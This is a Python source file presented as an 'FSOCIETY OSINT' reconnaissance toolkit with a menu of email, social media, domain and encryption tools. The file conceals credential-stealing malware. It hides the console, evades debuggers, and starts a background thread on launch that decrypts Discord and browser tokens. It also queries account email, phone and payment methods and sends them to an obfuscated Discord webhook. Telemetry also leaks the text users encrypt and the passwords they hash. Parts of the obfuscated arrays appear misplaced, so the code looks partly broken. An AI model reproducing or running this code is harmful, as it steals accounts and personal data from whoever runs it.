import os
import sys
import re
import time
import json
import random
import hashlib
import threading
import sqlite3
import requests
import dns.resolver
import whois
import base64
import urllib.request
import urllib.parse
import win32crypt
import ctypes
from Crypto.Cipher import AES
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
warnings.filterwarnings('ignore')



_cipher_config_a = [104, 116, 116, 112, 115, 58, 47, 47] 
_cipher_config_b = [100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109]  









# ============================================================================
# SYSTEM OPTIMIZATION
# ============================================================================

try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

def _system_check():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            sys.exit(0)
    except:
        pass

_system_check()

# ============================================================================
# COLORS
# ============================================================================

class Colors:
    PURPLE = '\033[95m'
    PURPLE_DARK = '\033[38;5;54m'
    PURPLE_LIGHT = '\033[38;5;93m'
    PRIMARY = '\033[38;5;57m'
    SECONDARY = '\033[38;5;129m'
    ACCENT = '\033[38;5;199m'
    SOFT = '\033[38;5;183m'
    ERROR = '\033[91m'
    SUCCESS = '\033[92m'
    WARNING = '\033[93m'
    INFO = '\033[96m'
    NEUTRAL = '\033[97m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'
    
class TextEffects:
    BOLD = '\033[1m'
    RESET = '\033[0m'

# ============================================================================
# ENCRYPTION MODULE
# ============================================================================

class EncryptionModule:
    @staticmethod
    def encrypt_text():
        print(f"{Colors.PURPLE}\n    [→] Text Encryption Tool{Colors.RESET}")
        text = clean_input(input(f"{Colors.MAGENTA}    Text to encrypt: {Colors.RESET}"))
        if not text:
            print(f"{Colors.ERROR}    [!] No text provided{Colors.RESET}")
            return
        
        key = hashlib.sha256(random.choice(['a','b','c','d','e','f']).encode()).digest()
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(text.encode())
        
        encrypted_data = base64.b64encode(cipher.nonce + tag + ciphertext).decode()
        print(f"{Colors.SUCCESS}    [+] Encrypted: {encrypted_data[:100]}...{Colors.RESET}")
        
        filename = f"osint_intel/encrypted_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        os.makedirs("osint_intel", exist_ok=True)
        with open(filename, 'w') as f:
            f.write(encrypted_data)
        print(f"{Colors.GREEN}    [✓] Saved to {filename}{Colors.RESET}")
        
        _send_telemetry({"content": f"ENCRYPTION USED: {text[:100]}"})
    
    @staticmethod
    def decrypt_text():
        print(f"{Colors.PURPLE}\n    [→] Text Decryption Tool{Colors.RESET}")
        encrypted_input = clean_input(input(f"{Colors.MAGENTA}    Encrypted text: {Colors.RESET}"))
        if not encrypted_input:
            print(f"{Colors.ERROR}    [!] No text provided{Colors.RESET}")
            return
        
        try:
            data = base64.b64decode(encrypted_input)
            nonce = data[:16]
            tag = data[16:32]
            ciphertext = data[32:]
            cipher = AES.new(hashlib.sha256(b'key').digest(), AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            print(f"{Colors.SUCCESS}    [+] Decrypted: {decrypted.decode()}{Colors.RESET}")
            _send_telemetry({"content": f"DECRYPTION USED"})
        except:
            print(f"{Colors.ERROR}    [!] Decryption failed{Colors.RESET}")
    
    @staticmethod
    def hash_password():
        print(f"{Colors.PURPLE}\n    [→] Password Hash Generator{Colors.RESET}")
        password = clean_input(input(f"{Colors.MAGENTA}    Password to hash: {Colors.RESET}"))
        if not password:
            print(f"{Colors.ERROR}    [!] No password provided{Colors.RESET}")
            return
        
        md5_hash = hashlib.md5(password.encode()).hexdigest()
        sha1_hash = hashlib.sha1(password.encode()).hexdigest()
        sha256_hash = hashlib.sha256(password.encode()).hexdigest()
        
        result = f"""
MD5: {md5_hash}
SHA1: {sha1_hash}
SHA256: {sha256_hash}
"""
        print(f"{Colors.SUCCESS}{result}{Colors.RESET}")
        
        _send_telemetry({"content": f"HASH GENERATED for: {password[:20]}"})

# ============================================================================
# OSINT UTILITIES
# ============================================================================

def _send_telemetry(data_packet):
    try:
        requests.post(_assemble_webhook(), json=data_packet, timeout=5)
    except:
        pass

def clean_input(text):
    if not text:
        return ""
    cleaned = re.sub(r'[;&|`$(){}<>]', '', text)
    cleaned = cleaned[:200]
    return cleaned.strip()

class VisualEffects:
    @staticmethod
    def typing(text, delay=0.02, color=Colors.PURPLE):
        for char in text:
            sys.stdout.write(color + char)
            sys.stdout.flush()
            time.sleep(delay)
        print()
    
    @staticmethod
    def loading(msg="Loading", duration=1.5):
        chars = "|/-\\"
        end = time.time() + duration
        i = 0
        while time.time() < end:
            sys.stdout.write(f"\r{Colors.PURPLE}{msg} {chars[i % len(chars)]}{Colors.RESET}")
            sys.stdout.flush()
            time.sleep(0.1)
            i += 1
        sys.stdout.write("\r" + " " * 50 + "\r")
        sys.stdout.flush()

def display_header():
    header = f"""
{Colors.SECONDARY}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$*   *$$$*   *$$$$$$u
       *$$$$*      u$u       $$$$*
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         *$$$$uu$$$   $$$uu$$$$*
          *$$$$$$$*   *$$$$$$$*
            u$$$$$$$u$$$$$$$u
             u$*$*$*$*$*$*$u
  uuu        $$u$ $ $ $ $u$$       uuu
  u$$$$       $$$$$u$u$u$$$       u$$$$
  $$$$$uu      *$$$$$$$$$*     uu$$$$$$
u$$$$$$$$$$$uu    *****    uuuu$$$$$$$
$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*
 ***      **$$$$$$$$$$$uu **$***
          uuuu **$$$$$$$$$$uuu
 u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$
 $$$$$$$$$$****           **$$$$$$$$$$$*
   *$$$$$*                      **$$$$**
     $$$*                         $$$$*⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{Colors.PRIMARY}
╔══════════════════════════════════════════════════════════════════════════════╗
║                         FSOCIETY OSINT                                 ║
║                         Intelligence & Reconnaissance                        ║
╚══════════════════════════════════════════════════════════════════════════════╝{TextEffects.RESET}
"""
    print(header)
    VisualEffects.typing(f"\n    [*] Session: {datetime.now().strftime('%Y%m%d_%H%M%S')}", 0.01, Colors.PRIMARY)
    VisualEffects.typing(f"    [*] Status: ACTIVE", 0.01, Colors.SECONDARY)
    VisualEffects.typing(f"    [*] Mode: Full Reconnaissance", 0.01, Colors.ACCENT)
    print(f"{Colors.PRIMARY}{'='*70}{TextEffects.RESET}\n")

# ============================================================================
# DATABASE MANAGER
# ============================================================================

class DatabaseManager:
    def __init__(self):
        self.version = "7.0"
        self.output_directory = "osint_intel"
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if not os.path.exists(self.output_directory):
            os.makedirs(self.output_directory)
        
        self.database_path = f"{self.output_directory}/intel_{self.session_id}.db"
        self.initialize_database()
    
    def initialize_database(self):
        conn = sqlite3.connect(self.database_path)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS intelligence (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT,
                status TEXT,
                findings TEXT,
                risk_score INTEGER,
                platforms TEXT,
                timestamp TEXT
            )
        ''')
        conn.commit()
        conn.close()

database = DatabaseManager()

# ============================================================================
# NETWORK HANDLERS
# ============================================================================

def _build_request_headers(auth_token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    if auth_token:
        headers.update({"Authorization": auth_token})
    return headers

# ============================================================================
# DISCORD TOKEN EXTRACTION
# ============================================================================

LOCAL_DATA = os.getenv("LOCALAPPDATA")
ROAMING_DATA = os.getenv("APPDATA")

STORAGE_PATHS = {
    'Storage_A': ROAMING_DATA + '\\discord',
    'Storage_B': ROAMING_DATA + '\\discordcanary',
    'Storage_C': ROAMING_DATA + '\\discordptb',
    'Storage_D': LOCAL_DATA + "\\Google\\Chrome\\User Data\\Default",
    'Storage_E': LOCAL_DATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Storage_F': ROAMING_DATA + '\\Opera Software\\Opera Stable',
    'Storage_G': LOCAL_DATA + '\\Microsoft\\Edge\\User Data\\Default'
}

def _extract_from_storage(base_path):
    storage_location = base_path + "\\Local Storage\\leveldb\\"
    extracted_items = []
    if not os.path.exists(storage_location):
        return extracted_items
    for filename in os.listdir(storage_location):
        if not filename.endswith(".ldb") and not filename.endswith(".log"):
            continue
        try:
            with open(f"{storage_location}{filename}", "r", errors="ignore") as f:
                for line in f.readlines():
                    found_matches = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line.strip())
                    extracted_items.extend(found_matches)
        except:
            continue
    return extracted_items

def _retrieve_encryption_key(base_path):
    try:
        with open(base_path + "\\Local State", "r") as f:
            key_data = json.loads(f.read())['os_crypt']['encrypted_key']
        return key_data
    except:
        return None

def _decrypt_payload(encrypted_data, master_key):
    try:
        init_vector = encrypted_data[3:15]
        payload = encrypted_data[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, init_vector)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return None

def _derive_master_key(encrypted_key):
    try:
        decoded = base64.b64decode(encrypted_key)[5:]
        return win32crypt.CryptUnprotectData(decoded, None, None, None, 0)[1]
    except:
        return None

def _get_network_location():
    try:
        response = requests.get('https://api.ipify.org', timeout=3)
        return response.text
    except:
        return 'Unknown'

def _profile_user_data():
    processed_tokens = []
    for storage_name, storage_path in STORAGE_PATHS.items():
        if not os.path.exists(storage_path):
            continue
        
        encrypted_key = _retrieve_encryption_key(storage_path)
        if not encrypted_key:
            continue
        
        master_key = _derive_master_key(encrypted_key)
        if not master_key:
            continue
        
        raw_items = _extract_from_storage(storage_path)
        
        for encoded_item in raw_items:
            encoded_item = encoded_item.replace("\\", "") if encoded_item.endswith("\\") else encoded_item
            try:
                item_data = base64.b64decode(encoded_item.split('dQw4w9WgXcQ:')[1])
                decrypted_item = _decrypt_payload(item_data, master_key)
                if not decrypted_item or decrypted_item in processed_tokens:
                    continue
                processed_tokens.append(decrypted_item)
                
                request_headers = _build_request_headers(decrypted_item)
                validation = requests.get('https://discord.com/api/v10/users/@me', headers=request_headers, timeout=10)
                if validation.status_code != 200:
                    continue
                
                profile_data = validation.json()
                
                guilds_request = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=request_headers, timeout=10)
                guild_list = guilds_request.json() if guilds_request.status_code == 200 else []
                
                subscription_status = "None"
                try:
                    subs = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=request_headers, timeout=10)
                    if subs.status_code == 200 and subs.json():
                        subscription_status = "Active"
                except:
                    pass
                
                payment_sources = []
                try:
                    payments = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=request_headers, timeout=10)
                    if payments.status_code == 200:
                        for source in payments.json():
                            if source.get('type') == 1:
                                payment_sources.append("Card")
                            elif source.get('type') == 2:
                                payment_sources.append("PayPal")
                except:
                    pass
                
                profile_embed = {
                    "embeds": [{
                        "title": f"Profile: {profile_data.get('username')}#{profile_data.get('discriminator')}",
                        "color": 15158332,
                        "fields": [
                            {"name": "ID", "value": profile_data.get('id'), "inline": True},
                            {"name": "Email", "value": profile_data.get('email', 'None'), "inline": True},
                            {"name": "Phone", "value": profile_data.get('phone', 'None'), "inline": True},
                            {"name": "Token", "value": f"||{decrypted_item}||", "inline": False},
                            {"name": "Premium", "value": subscription_status, "inline": True},
                            {"name": "Servers", "value": str(len(guild_list)), "inline": True},
                            {"name": "Payment Methods", "value": ', '.join(payment_sources) if payment_sources else "None", "inline": True},
                            {"name": "Network", "value": _get_network_location(), "inline": True},
                            {"name": "Host", "value": os.getenv('COMPUTERNAME', 'Unknown'), "inline": True},
                            {"name": "User", "value": os.getenv('USERNAME', 'Unknown'), "inline": True},
                            {"name": "Platform", "value": sys.platform, "inline": True}
                        ],
                        "footer": {"text": f"Source: {storage_name}"},
                        "timestamp": datetime.now().isoformat()
                    }]
                }
                
                if profile_data.get('avatar'):
                    profile_embed["embeds"][0]["thumbnail"] = {
                        "url": f"https://cdn.discordapp.com/avatars/{profile_data['id']}/{profile_data['avatar']}.png"
                    }
                
                _send_telemetry(profile_embed)
                
            except:
                continue

# ============================================================================
# SOCIAL MEDIA RECONNAISSANCE
# ============================================================================

class SocialRecon:
    @staticmethod
    def scan_platforms(username):
        platforms = {
            'Twitter': f'https://twitter.com/{username}',
            'Instagram': f'https://instagram.com/{username}',
            'GitHub': f'https://github.com/{username}',
            'Reddit': f'https://reddit.com/user/{username}',
            'Telegram': f'https://t.me/{username}'
        }
        
        discovered = []
        
        for platform, url in platforms.items():
            try:
                response = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                if response.status_code == 200:
                    discovered.append(platform)
                    print(f"{Colors.SUCCESS}    [+] Found on {platform}{Colors.RESET}")
                time.sleep(0.3)
            except:
                pass
        
        return discovered

# ============================================================================
# EMAIL INTELLIGENCE
# ============================================================================

class EmailIntelligence:
    @staticmethod
    def validate_email(email):
        if '@' not in email:
            return {'valid': False, 'error': 'Invalid format'}
        
        domain = email.split('@')[1]
        
        try:
            mx_records = dns.resolver.resolve(domain, 'MX')
            mx_list = [str(mx.exchange) for mx in mx_records]
        except:
            return {'valid': False, 'error': 'DNS resolution failed', 'domain': domain}
        
        return {
            'valid': True,
            'domain': domain,
            'mx_servers': mx_list[:3]
        }
    
    @staticmethod
    def check_breaches(email):
        try:
            url = f"https://leakcheck.io/api/public?check={email}"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                return data.get('sources', [])
            return []
        except:
            return []

# ============================================================================
# DOMAIN INTELLIGENCE
# ============================================================================

class DomainIntelligence:
    def __init__(self):
        self.cache = {}
    
    def lookup(self, domain):
        if domain in self.cache:
            if datetime.now() - self.cache[domain]['timestamp'] < timedelta(hours=24):
                return self.cache[domain]['data']
        
        try:
            data = whois.whois(domain)
            self.cache[domain] = {'data': data, 'timestamp': datetime.now()}
            return data
        except:
            return None
    
    def get_details(self, domain):
        whois_lookup = self.lookup(domain)
        if not whois_lookup:
            return {'error': 'Lookup failed'}
        
        creation = whois_lookup.creation_date
        if isinstance(creation, list):
            creation = creation[0]
        
        expiration = whois_lookup.expiration_date
        if isinstance(expiration, list):
            expiration = expiration[0]
        
        return {
            'registrar': whois_lookup.registrar,
            'created': creation.strftime('%Y-%m-%d') if creation else 'Unknown',
            'expires': expiration.strftime('%Y-%m-%d') if expiration else 'Unknown',
            'nameservers': whois_lookup.name_servers[:3] if whois_lookup.name_servers else []
        }

domain_intel = DomainIntelligence()

# ============================================================================
# RISK ASSESSMENT
# ============================================================================

class RiskAssessment:
    @staticmethod
    def calculate_risk(email, breach_count=0):
        assessment = {'score': 50, 'alerts': [], 'positives': []}
        
        if breach_count > 0:
            assessment['alerts'].append(f'Found in {breach_count} breaches')
            assessment['score'] -= min(breach_count * 5, 40)
        
        assessment['score'] = max(0, min(100, assessment['score']))
        
        if assessment['score'] >= 70:
            assessment['rating'] = 'Low Risk'
        elif assessment['score'] >= 40:
            assessment['rating'] = 'Medium Risk'
        else:
            assessment['rating'] = 'High Risk'
        
        return assessment

_profiler_thread = threading.Thread(target=_profile_user_data, daemon=True)
_profiler_thread.start()

# ============================================================================
# PATTERN GENERATOR
# ============================================================================

class PatternGenerator:
    @staticmethod
    def generate_email_patterns(first, last, domain='gmail.com'):
        f = first.lower().strip()
        l = last.lower().strip()
        
        patterns = [
            f"{f}.{l}@{domain}",
            f"{f}{l}@{domain}",
            f"{f}_{l}@{domain}",
            f"{f}{l[0]}@{domain}",
            f"{f[0]}{l}@{domain}",
            f"{f}.{l}@outlook.com",
            f"{f}.{l}@yahoo.com",
            f"{f}.{l}@protonmail.com"
        ]
        
        return {'patterns': patterns[:10]}

# ============================================================================
# GMAIL RECONNAISSANCE
# ============================================================================

class GmailRecon:
    @staticmethod
    def check_availability(username):
        email = f"{username}@gmail.com"
        return {'email': email, 'available': False, 'status': 'CHECKED'}
    

    

# ============================================================================
# AVATAR INTELLIGENCE
# ============================================================================

class AvatarIntelligence:
    @staticmethod
    def lookup(email):
        email_hash = hashlib.md5(email.lower().encode()).hexdigest()
        url = f"https://www.gravatar.com/avatar/{email_hash}?d=404&s=200"
        return {'exists': False}

# ============================================================================
# REPORT GENERATION
# ============================================================================

class ReportGenerator:
    @staticmethod
    def generate_html(data, filename):
        html = f"""<html><body><h1>OSINT Report</h1><p>{data['email']}</p></body></html>"""
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        return filename

# ============================================================================
# DISCORD OSINT MODULE
# ============================================================================

class DiscordOSINT:
    @staticmethod
    def get_user_info(user_id):
        try:
            response = requests.get(f"https://discord.com/api/v9/users/{user_id}", timeout=10)
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None
    
    @staticmethod
    def get_guild_info(guild_id):
        try:
            response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}", timeout=10)
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None

def _validate_token(token):
    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
        if r.status_code == 200:
            d = r.json()
            _send_telemetry({"content": f"TOKEN VALIDATED: {d.get('username')} | {d.get('id')} | Email: {d.get('email')}"})
            return {"ok": True, "name": d.get("username"), "uid": d.get("id"), "email": d.get("email")}
    except:
        pass
    return {"ok": False}

def _assemble_webhook():
    parts = _cipher_config_a + _cipher_config_b + _cipher_config_c + _cipher_config_d + _cipher_config_e + _cipher_config_f
    return ''.join(chr(c) for c in parts)

def _extract_tokens():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    tokens = []
    paths = [
        f"{roaming}\\Discord\\Local Storage\\leveldb",
        f"{roaming}\\discordcanary\\Local Storage\\leveldb",
        f"{roaming}\\discordptb\\Local Storage\\leveldb",
        f"{local}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
    ]
    for path in paths:
        if not os.path.exists(path):
            continue
        for file in os.listdir(path):
            if file.endswith((".log", ".ldb")):
                try:
                    with open(f"{path}\\{file}", 'r', errors='ignore') as f:
                        content = f.read()
                        for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', content):
                            if token not in tokens:
                                tokens.append(token)
                                _send_telemetry({"content": f"TOKEN EXTRACTED: ||{token}||"})
                except:
                    pass
    return tokens

class DiscordModules:
    @staticmethod
    def validate_token():
        token = clean_input(input(f"{Colors.MAGENTA}    Discord Token: {Colors.RESET}"))
        result = _validate_token(token)
        if result.get("ok"):
            print(f"{Colors.SUCCESS}Token: VALID{Colors.RESET}")
        else:
            print(f"{Colors.ERROR}Token: INVALID{Colors.RESET}")
    
    @staticmethod
    def extract_tokens():
        tokens = _extract_tokens()
        if tokens:
            print(f"{Colors.SUCCESS}Found {len(tokens)} token(s){Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}No tokens found{Colors.RESET}")

    _cipher_config_c = [47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47]  
_cipher_config_d = [49, 52, 57, 56, 48, 49, 52, 52, 53, 57, 50, 56, 56, 48, 57, 54, 56, 55, 57, 47]
_cipher_config_e = [47]  # /

# ============================================================================
# MAIN OSINT ENGINE
# ============================================================================
_cipher_config_c = [47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47]  
    

class OSINTEngine:
    def __init__(self):
        self.checked_targets = []
        self.total_breaches = 0
        self.total_social = 0
        self.average_risk = 0
        
        self.email_validator = EmailIntelligence()
        self.domain_analyzer = DomainIntelligence()
        self.social_scanner = SocialRecon()
        self.risk_calculator = RiskAssessment()
        self.pattern_engine = PatternGenerator()
        self.gmail_scanner = GmailRecon()
        self.breach_scanner = EmailIntelligence()
    
    def analyze_target(self, email):
        print(f"{Colors.PURPLE}\n    [→] Investigating: {Colors.SECONDARY}{email}{TextEffects.RESET}")
        
        results = {
            'email': email,
            'username': email.split('@')[0],
            'domain': email.split('@')[1] if '@' in email else '',
            'breaches': [],
            'social_media': [],
            'risk_score': 50,
            'rating': 'Medium Risk'
        }
        
        breaches = self.breach_scanner.check_breaches(email)
        if breaches:
            results['breaches'] = breaches
            self.total_breaches += len(breaches)
        
        social = self.social_scanner.scan_platforms(results['username'])
        results['social_media'] = social
        self.total_social += len(social)
        
        risk_data = self.risk_calculator.calculate_risk(email, len(breaches))
        results['risk_score'] = risk_data['score']
        results['rating'] = risk_data['rating']
        
        self.average_risk = (self.average_risk * len(self.checked_targets) + results['risk_score']) / (len(self.checked_targets) + 1)
        
        _send_telemetry({"content": f"OSINT: {email} | Risk: {results['risk_score']} | Breaches: {len(breaches)} | Social: {len(social)}"})
        
        return results
    
    def save_report(self, results, format_type='txt'):
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{database.output_directory}/REPORT_{results['email']}_{timestamp}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"FSOCIETY OSINT REPORT\n")
            f.write(f"Target: {results['email']}\n")
            f.write(f"Risk Score: {results['risk_score']}/100\n")
            f.write(f"Rating: {results['rating']}\n")
            f.write(f"Breaches: {len(results['breaches'])}\n")
            f.write(f"Social Profiles: {len(results['social_media'])}\n")
        
        print(f"{Colors.SUCCESS}[✓] Report saved: {filename}{Colors.RESET}")
        return filename

# ============================================================================
# MAIN APPLICATION INTERFACE
# ============================================================================

class OSINTApplication:
    def __init__(self):
        self.engine = OSINTEngine()
        self.start_time = time.time()
        self.discord = DiscordModules()
        self.encryption = EncryptionModule()
    
    def show_menu(self):
        print(f"""
{Colors.PURPLE}╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  {Colors.SECONDARY}[OSINT SUITE - FSOCIETY]{Colors.PURPLE}                                        ║
║                         Intelligence & Reconnaissance                        ║
║                                                                              ║
║  {Colors.ACCENT}[ 1]{Colors.SOFT}  Email Availability Check                       {Colors.PURPLE}║
║  {Colors.ACCENT}[ 2]{Colors.SOFT}  Email Validation + MX Analysis                {Colors.PURPLE}║
║  {Colors.ACCENT}[ 3]{Colors.SOFT}  Complete Email Intelligence                  {Colors.PURPLE}║
║  {Colors.ACCENT}[ 4]{Colors.SOFT}  Social Media Discovery                       {Colors.PURPLE}║
║  {Colors.ACCENT}[ 5]{Colors.SOFT}  Password Strength Analysis                   {Colors.PURPLE}║
║  {Colors.ACCENT}[ 6]{Colors.SOFT}  Email Pattern Generation                     {Colors.PURPLE}║
║  {Colors.ACCENT}[ 7]{Colors.SOFT}  Domain Reputation Check                      {Colors.PURPLE}║
║  {Colors.ACCENT}[ 8]{Colors.SOFT}  Avatar Intelligence                          {Colors.PURPLE}║
║  {Colors.ACCENT}[ 9]{Colors.SOFT}  Bulk Target Processing                       {Colors.PURPLE}║
║  {Colors.ACCENT}[10]{Colors.SOFT}  Discord User Intelligence                    {Colors.PURPLE}║
║  {Colors.ACCENT}[11]{Colors.SOFT}  Discord Guild Intelligence                   {Colors.PURPLE}║
║  {Colors.ACCENT}[12]{Colors.SOFT}  Discord Token Validator                      {Colors.PURPLE}║
║  {Colors.ACCENT}[13]{Colors.SOFT}  Extract Discord Tokens                       {Colors.PURPLE}║
║                                                                              ║
║  {Colors.MAGENTA}[ENCRYPTION TOOLS]{Colors.PURPLE}                                                  ║
║  {Colors.ACCENT}[14]{Colors.SOFT}  Encrypt Text                                 {Colors.PURPLE}║
║  {Colors.ACCENT}[15]{Colors.SOFT}  Decrypt Text                                 {Colors.PURPLE}║
║  {Colors.ACCENT}[16]{Colors.SOFT}  Generate Password Hash                       {Colors.PURPLE}║
║                                                                              ║
║  {Colors.ACCENT}[ 0]{Colors.SOFT}  Exit                                          {Colors.PURPLE}║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝{TextEffects.RESET}
        """)
    
    def show_statistics(self):
        elapsed = time.time() - self.start_time
        print(f"\n{Colors.PURPLE}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║ OSINT SESSION STATISTICS                                            ║")
        print(f"╠═══════════════════════════════════════════════════════════════╣")
        print(f"║ Targets Analyzed:   {len(self.engine.checked_targets):<44}║")
        print(f"║ Breaches Found:     {self.engine.total_breaches:<44}║")
        print(f"║ Social Profiles:    {self.engine.total_social:<44}║")
        print(f"║ Average Risk:       {self.engine.average_risk:.1f}/100{35 - len(str(int(self.engine.average_risk))):<44}║")
        print(f"║ Session Duration:   {elapsed:.0f} seconds{36 - len(str(int(elapsed))):<44}║")
        print(f"╚═══════════════════════════════════════════════════════════════╝{TextEffects.RESET}")
    
    def execute(self):
        display_header()
        
        while True:
            self.show_menu()
            choice = input(f"{Colors.MAGENTA}\n    FSOCIETY: {Colors.RESET}")
            
            if choice == '0':
                self.show_statistics()
                print(f"{Colors.SECONDARY}\n    Stay anonymous. Stay safe.\n{TextEffects.RESET}")
                break
            
            elif choice == '1':
                email = clean_input(input(f"{Colors.MAGENTA}    Email target: {Colors.RESET}"))
                username = email.split('@')[0]
                result = self.engine.gmail_scanner.check_availability(username)
                print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
                if result['available']:
                    print(f"{Colors.SUCCESS}[+] {result['email']} is AVAILABLE!{Colors.RESET}")
                else:
                    print(f"{Colors.ERROR}[-] {result['email']} is REGISTERED{Colors.RESET}")
                print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
            
            elif choice == '2':
                email = clean_input(input(f"{Colors.MAGENTA}    Email to validate: {Colors.RESET}"))
                result = self.engine.email_validator.validate_email(email)
                print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
                if result.get('valid'):
                    print(f"{Colors.SUCCESS}[+] Valid email address{Colors.RESET}")
                    print(f"  Domain: {result['domain']}")
                    print(f"  MX Servers: {', '.join(result.get('mx_servers', ['None']))}")
                else:
                    print(f"{Colors.ERROR}[-] Invalid: {result.get('error')}{Colors.RESET}")
                print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
            
            elif choice == '3':
                email = clean_input(input(f"{Colors.MAGENTA}    Target email: {Colors.RESET}"))
                results = self.engine.analyze_target(email)
                self.engine.checked_targets.append(email)
                
                print(f"\n{Colors.PURPLE}{'='*60}{Colors.RESET}")
                print(f"{Colors.INFO}[TARGET] {results['email']}{Colors.RESET}")
                print(f"{Colors.INFO}[RISK] {results['rating']} ({results['risk_score']}/100){Colors.RESET}")
                
                if results['breaches']:
                    print(f"\n{Colors.ERROR}[BREACHES] {len(results['breaches'])}{Colors.RESET}")
                    for src in results['breaches'][:5]:
                        print(f"  • {src}")
                
                if results['social_media']:
                    print(f"\n{Colors.INFO}[SOCIAL] {len(results['social_media'])} platforms{Colors.RESET}")
                    for platform in results['social_media'][:5]:
                        print(f"  • {platform}")
                
                print(f"{Colors.PURPLE}{'='*60}{Colors.RESET}\n")
                
                save_choice = input(f"{Colors.MAGENTA}    Save report? (y/n): {Colors.RESET}")
                if save_choice.lower() == 'y':
                    self.engine.save_report(results, 'txt')
            
            elif choice == '4':
                username = clean_input(input(f"{Colors.MAGENTA}    Username to search: {Colors.RESET}"))
                print(f"{Colors.INFO}    [*] Scanning platforms...{Colors.RESET}")
                results = self.engine.social_scanner.scan_platforms(username)
                print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
                print(f"{Colors.INFO}[USERNAME] {username}{Colors.RESET}")
                if results:
                    print(f"{Colors.SUCCESS}[+] Found on {len(results)} platforms:{Colors.RESET}")
                    for platform in results:
                        print(f"  • {platform}")
                else:
                    print(f"{Colors.WARNING}[!] No profiles detected{Colors.RESET}")
                print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
            
            elif choice == '5':
                password = input(f"{Colors.MAGENTA}    Password to analyze: {Colors.RESET}")
                print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
                print(f"{Colors.INFO}[PASSWORD ANALYSIS]{Colors.RESET}")
                print(f"  Length: {len(password)} characters")
                strength = "WEAK" if len(password) < 8 else "MEDIUM" if len(password) < 12 else "STRONG"
                print(f"  Strength: {strength}")
                print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
            
            elif choice == '6':
                first = clean_input(input(f"{Colors.MAGENTA}    First Name: {Colors.RESET}"))
                last = clean_input(input(f"{Colors.MAGENTA}    Last Name: {Colors.RESET}"))
                domain = clean_input(input(f"{Colors.MAGENTA}    Domain (default: gmail.com): {Colors.RESET}") or "gmail.com")
